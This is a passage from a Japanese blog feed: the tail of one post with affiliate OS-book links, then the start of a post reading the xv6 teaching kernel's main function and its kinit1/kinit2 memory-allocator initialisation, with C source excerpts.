&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;これでxv6カーネルの&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数で呼び出している18個の関数のうち、3つのソースコードを読みました。&lt;/p&gt;
&lt;p&gt;まだまだ先は長いですが少しずつ進めていきます。&lt;/p&gt;
&lt;h2 id=&quot;参考書籍&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot; aria-label=&quot;参考書籍 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;参考書籍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qZSCY7&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;30日でできる! OS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qXYsZX&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ゼロからのOS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3I6fkVt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解 Linuxカーネル&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3JRUdI2&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;作って理解するOS x86系コンピュータを動かす理論と実装&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[xv6OSを真面目に読みこんでカーネルを完全に理解する -メモリ割り当て・排他制御 編-]]></title><description><![CDATA[教育用OSのxv6OSのソースコードを読んでカーネルについて学んでいきます。この記事ではxv6OSのカーネルのmain関数の挙動を読み解きます。]]></description><link>https://kashiwaba-yuki.com/unix-xv6-004-kernel-main-01</link><guid isPermaLink="false">https://kashiwaba-yuki.com/unix-xv6-004-kernel-main-01</guid><pubDate>Tue, 25 Jan 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;にインスパイアされて&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;を読んでます。&lt;/p&gt;
&lt;p&gt;UNIX V6自体はx86CPUでは動作しないため、基本的には、UNIXv6をX86アーキテクチャで動くようにした&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;のリポジトリをForkした&lt;a href=&quot;https://github.com/kash1064/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kash1064/xv6-public: xv6 OS&lt;/a&gt;のソースコードを読んでいくことにしました。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/unix-xv6-002-load-kernel&quot;&gt;前回&lt;/a&gt;まででxv6OSのビルドと起動プロセスまで読み進めました。&lt;/p&gt;
&lt;p&gt;いよいよカーネルを読み進めていきます。&lt;/p&gt;
&lt;p&gt;まずは&lt;code class=&quot;language-text&quot;&gt;main.c&lt;/code&gt;から読んでいきます。&lt;/p&gt;
&lt;p&gt;基本的にはCのソースコードを読みつつ、必要に応じて&lt;code class=&quot;language-text&quot;&gt;kernel.asm&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;kernel.sym&lt;/code&gt;を参照してgdbデバッグを行う流れで処理を追っていきます。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#main%E9%96%A2%E6%95%B0&quot;&gt;main関数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#kinit1%E9%96%A2%E6%95%B0&quot;&gt;kinit1関数&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#kinit1%E9%96%A2%E6%95%B0%E3%81%AE%E5%BC%95%E6%95%B0&quot;&gt;kinit1関数の引数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#initlock%E9%96%A2%E6%95%B0&quot;&gt;initlock関数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#freerange%E9%96%A2%E6%95%B0&quot;&gt;freerange関数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#kfree%E9%96%A2%E6%95%B0&quot;&gt;kfree関数&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#kinit2%E9%96%A2%E6%95%B0&quot;&gt;kinit2関数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#xv6%E3%81%AE%E3%83%AD%E3%83%83%E3%82%AF%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;xv6のロックについて&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#acquire%E9%96%A2%E6%95%B0&quot;&gt;acquire関数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#release%E9%96%A2%E6%95%B0&quot;&gt;release関数&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%8A%E3%81%BE%E3%81%91%E3%83%87%E3%83%90%E3%83%83%E3%82%AC%E3%81%A7panic%E9%96%A2%E6%95%B0%E3%82%92%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B&quot;&gt;おまけ：デバッガでpanic関数を呼び出してみる&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%8A%E3%81%BE%E3%81%91memset%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;おまけ：memsetについて&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot;&gt;参考書籍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;main関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#main%E9%96%A2%E6%95%B0&quot; aria-label=&quot;main関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;main関数&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;/unix-xv6-002-load-kernel&quot;&gt;前回&lt;/a&gt;の記事では、&lt;code class=&quot;language-text&quot;&gt;main.c&lt;/code&gt;のmain関数を呼び出すところまで見ていきました。&lt;/p&gt;
&lt;p&gt;ここからは、カーネル本体の動きを見ていきます。&lt;/p&gt;
&lt;p&gt;まず、&lt;code class=&quot;language-text&quot;&gt;main.c&lt;/code&gt;の中からmain関数の行のみを抜粋しました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;startothers&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mpmain&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;token keyword&quot;&gt;__attribute__&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;noreturn&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;pde_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;kpgdir&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; end&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// first address after kernel loaded from ELF file&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Bootstrap processor starts running C code here.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Allocate a real stack and switch to it, first&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// doing some setup required for memory allocator to work.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;kinit1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;end&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// phys page allocator&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;kvmalloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// kernel page table&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;mpinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;// detect other processors&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;lapicinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;     &lt;span class=&quot;token comment&quot;&gt;// interrupt controller&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;seginit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;token comment&quot;&gt;// segment descriptors&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;picinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;token comment&quot;&gt;// disable pic&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;ioapicinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;// another interrupt controller&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;consoleinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;// console hardware&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;uartinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// serial port&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;pinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;         &lt;span class=&quot;token comment&quot;&gt;// process table&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;tvinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;// trap vectors&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;binit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;         &lt;span class=&quot;token comment&quot;&gt;// buffer cache&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;fileinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// file table&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;ideinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;token comment&quot;&gt;// disk &lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;startothers&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;// start other processors&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;kinit2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;PHYSTOP&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// must come after startothers()&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;userinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// first user process&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;mpmain&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;// finish this processor&apos;s setup&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;関数がずらっと並んでおり、上から順に実行されています。&lt;/p&gt;
&lt;p&gt;この記事では、&lt;code class=&quot;language-text&quot;&gt;kinit1&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;kinit2&lt;/code&gt;関数について見ていきます。&lt;/p&gt;
&lt;h2 id=&quot;kinit1関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#kinit1%E9%96%A2%E6%95%B0&quot; aria-label=&quot;kinit1関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;kinit1関数&lt;/h2&gt;
&lt;p&gt;最初に実行されるkinit1関数は、&lt;code class=&quot;language-text&quot;&gt;kalloc.c&lt;/code&gt;で定義されている関数です。&lt;/p&gt;
&lt;p&gt;xv6カーネルは&lt;code class=&quot;language-text&quot;&gt;kinit1&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;kinit2&lt;/code&gt;を呼び出してメモリアロケータの初期化を行います。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Initialization happens in two phases.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// 1. main() calls kinit1() while still using entrypgdir to place just&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// the pages mapped by entrypgdir on free list.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// 2. main() calls kinit2() with the rest of the physical pages&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// after installing a full page table that maps them on all cores.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;kinit1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;vstart&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;vend&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;initlock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;kmem&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;use_lock &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;freerange&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;vstart&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; vend&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;kinit2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;vstart&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;vend&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;freerange&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;vstart&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; vend&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;use_lock &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;カーネルは実行時に、ページテーブルやプロセス、ユーザメモリ、カーネルスタック、パイプバッファなどのために物理メモリ領域を割り当てて解放しておく必要があります。&lt;/p&gt;
&lt;p&gt;xv6OSの場合は、カーネル本体が格納されるアドレスの末尾から&lt;code class=&quot;language-text&quot;&gt;PHYSTOP&lt;/code&gt;までの物理メモリが割り当て領域として使用されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;PHYSTOP&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;memlayout.h&lt;/code&gt;にて以下のように定義されています。&lt;/p&gt;
